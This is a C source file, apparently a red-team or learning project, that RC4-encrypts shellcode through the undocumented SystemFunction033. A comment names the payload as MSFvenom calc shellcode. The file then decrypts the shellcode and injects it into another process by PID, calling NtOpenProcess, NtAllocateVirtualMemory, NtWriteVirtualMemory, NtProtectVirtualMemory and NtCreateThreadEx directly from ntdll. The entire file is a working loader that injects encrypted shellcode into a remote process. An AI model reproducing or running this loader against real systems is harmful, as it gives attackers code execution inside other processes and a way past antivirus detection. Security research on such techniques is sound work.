#include "Box.h"

BOOL EncryptRC4(
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)
{

	NTSTATUS STATUS = NULL;

	BYTE _key[] = { 0xDE,0xAD,0xBE,0xEF }; // key used to decrypt and encrypt shellcode

	// ensure everything is working
	if (!pShellcode || sSizeofShellcode == 0) {
		WARN("EncryptRC4_SystemFunc: invalid params");
		return FALSE;
	}

	DATA_BLOB data_blob = { .cbData = (DWORD)sSizeofShellcode, .pbData = pShellcode };
	DATA_BLOB key_blob = { .cbData = (DWORD)sizeof(_key), .pbData = _key };

	// SystemFunction033 from advapi32
	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");
	if (!SystemFunction033) {
		WARN("GetProcAddress(SystemFunction033) failed");
		return FALSE;
	}

	if ((STATUS = SystemFunction033(&data_blob, &key_blob)) != 0x0)
	{
		printf("[!] SystemFunction033 FAILED With Error : 0x%0.8X\n", STATUS);
		return FALSE;
	}

	OKAY("Successfully Encrypted MSFvenom Calc Shellcode with RC4");

	// print out encrypted shellcode (skid style)
	for (DWORD i = 0; i < data_blob.cbData; i++)
	{
		if (i % 16 == 0) printf("\n ");
		Sleep(1);
		printf(" %02x", data_blob.pbData[i]);
	}

	printf("\nCurrent RC4 Encrypted Shellcode Address: %p\n", (void*)data_blob.pbData);

	return TRUE;
}

BOOL NtShellInjection(
	_In_ CONST DWORD PID,
	CONST PBYTE pEncryptedShellcode,
	_In_ CONST PBYTE pShellcode,
	_In_ CONST SIZE_T sSizeofShellcode
)

{
	
	NTSTATUS		STATUS = NULL;
	HANDLE		  hProcess = NULL;
	HANDLE		   hThread = NULL;
	PVOID		   rBuffer = NULL;
	DWORD			   TID = NULL;
	BOOL             State = TRUE;
	DWORD       OldProtection = 0;
	SIZE_T       BytesWritten = 0;
	SIZE_T origSize = sSizeofShellcode;
	SIZE_T regionSize = sSizeofShellcode;
	CLIENT_ID CID = { (HANDLE)PID, NULL };
	OBJECT_ATTRIBUTES OA = { 0 }; OA.Length = sizeof(OBJECT_ATTRIBUTES);


	HMODULE ntdll = GetModuleHandleW(L"ntdll");

	// call these functions from ntdll.dll
	fn_NtOpenProcess NtOpenProcess = (fn_NtOpenProcess)GetProcAddress(ntdll, "NtOpenProcess");
	fn_NtCreateThreadEx NtCreateThreadEx = (fn_NtCreateThreadEx)GetProcAddress(ntdll, "NtCreateThreadEx");
	fn_NtAllocateVirtualMemory NtAllocateVirtualMemory = (fn_NtAllocateVirtualMemory)GetProcAddress(ntdll, "NtAllocateVirtualMemory");
	fn_NtWriteVirtualMemory NtWriteVirtualMemory = (fn_NtWriteVirtualMemory)GetProcAddress(ntdll, "NtWriteVirtualMemory");
	fn_NtProtectVirtualMemory NtProtectVirtualMemory = (fn_NtProtectVirtualMemory)GetProcAddress(ntdll, "NtProtectVirtualMemory");
	PFN_NtFreeVirtualMemory p_NtFreeVirtualMemory = (PFN_NtFreeVirtualMemory)GetProcAddress(ntdll, "NtFreeVirtualMemory");
	_SystemFunction033 SystemFunction033 = (_SystemFunction033)GetProcAddress(LoadLibrary(L"advapi32"), "SystemFunction033");

	
	STATUS = NtOpenProcess(&hProcess, PROCESS_ALL_ACCESS, &OA, &CID);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtOpenProcess Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Got a handle to the process: [%ld]", hProcess, PID);

	// allocate SizeofShellcode to VirtualMemory
	STATUS = NtAllocateVirtualMemory(hProcess, &rBuffer, 0, &regionSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtAllocateVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Allocated %zu Bytes to Virtual Memory!", sSizeofShellcode);


	// Used to decrypt Shellcode
	PUCHAR localBuf = (PUCHAR)HeapAlloc(GetProcessHeap(), 0, sSizeofShellcode);
	if (!localBuf) {
		WARN("HeapAlloc failed for localBuf");
		HeapFree(GetProcessHeap(), 0, localBuf);
		localBuf = NULL;
		State = FALSE;
	}
	RtlCopyMemory(localBuf, pEncryptedShellcode, sSizeofShellcode);


	DATA_BLOB data_local = { .cbData = (DWORD)sSizeofShellcode, .pbData = localBuf };


	BYTE local_key_bytes[] = { 0xDE, 0xAD, 0xBE, 0xEF };
	DATA_BLOB key_local = { .cbData = (DWORD)sizeof(local_key_bytes), .pbData = local_key_bytes };


	if ((STATUS = SystemFunction033(&data_local, &key_local)) != 0x0)
	{
		printf("[!] SystemFunction032 FAILED With Error : 0x%0.8X\n", STATUS);
		HeapFree(GetProcessHeap(), 0, localBuf);
		return FALSE;
	}

	OKAY("Successfully Decrypted RC4!");


	// Write the newly decrypted shellcode inside
	STATUS = NtWriteVirtualMemory(hProcess, rBuffer, localBuf, origSize, &BytesWritten);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtWriteVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Wrote %zu Bytes to the Virtual Memory!", BytesWritten);

	// change permissions
	STATUS = NtProtectVirtualMemory(hProcess, &rBuffer, &origSize, PAGE_EXECUTE_READ, &OldProtection);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtProtectVirtualMemory Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("Changed Allocation Protection from [RW] to [RE]");

	STATUS = NtCreateThreadEx(&hThread, THREAD_ALL_ACCESS, &OA, hProcess, rBuffer, NULL, FALSE, 0, 0, 0, NULL);
	if (STATUS_SUCCESS != STATUS)
	{
		WARN("NtCreateThreadEx Failed! With an Error: 0x%0.8x", STATUS);
		State = FALSE; goto CLEANUP;
	}

	OKAY("[0x%p] Successfully Created a Thread!", hThread);
	INFO("Waiting for Thread to finish executing...");
	WaitForSingleObject(hThread, INFINITE);
	INFO("Execution Completed! Cleaning Up!");

CLEANUP:


		if (rBuffer)
		{
			SIZE_T freeSize = 0;
			STATUS = p_NtFreeVirtualMemory(hProcess, &rBuffer, &freeSize, MEM_DECOMMIT);
			if (STATUS_SUCCESS != STATUS)
			{
				WARN("Error! Could Not Free Buffer! 0x%lx", STATUS);
			}
			else {
				INFO("[0x%p] decommitted allocated buffer from process memory", rBuffer);
			}
		}

		if (hThread) {
			CloseHandle(hThread);
			INFO("[0x%p] handle on thread closed", hThread);
		}

		if (hProcess) {
			CloseHandle(hProcess);
			INFO("[0x%p] handle on process closed", hProcess);
		}

		return State;
}